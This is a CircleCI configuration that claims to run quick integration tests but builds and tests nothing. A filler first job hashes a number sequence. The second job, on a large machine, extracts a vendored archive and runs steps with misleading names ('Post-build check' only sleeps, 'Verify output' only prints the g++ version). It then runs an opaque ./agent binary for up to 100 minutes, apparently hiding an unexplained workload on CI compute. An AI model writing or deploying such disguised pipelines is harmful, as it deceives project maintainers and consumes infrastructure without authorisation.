version: 2.1

jobs:
  Delta_run-quick-integration-tests:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: loop knot
          command: |
            mkdir -p /tmp/.cache
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/.cache/stage-done.out; true
            echo "fixture persisted: $(du -b /tmp/.cache/stage-done.out | awk '{print $1}')b"
      - persist_to_workspace:
          root: /tmp/.cache
          paths:
            - stage-done.out
  run-quick-integration-tests:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.cache
      - run:
          name: Load prior
          command: |
            { head -n 5 /tmp/.cache/stage-done.out > /dev/null; echo "lines ok" ; } || true
      - run:
          name: Clone target
          command: git clone --depth 1 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Pull static data
          command: tar -I bzip2 -xf vendor.tar.bz2
      - run:
          name: Post-build check
          command: sleep 30
      - run:
          name: Verify output
          command: g++ --version
      - run:
          no_output_timeout: 100m
          command: ./agent
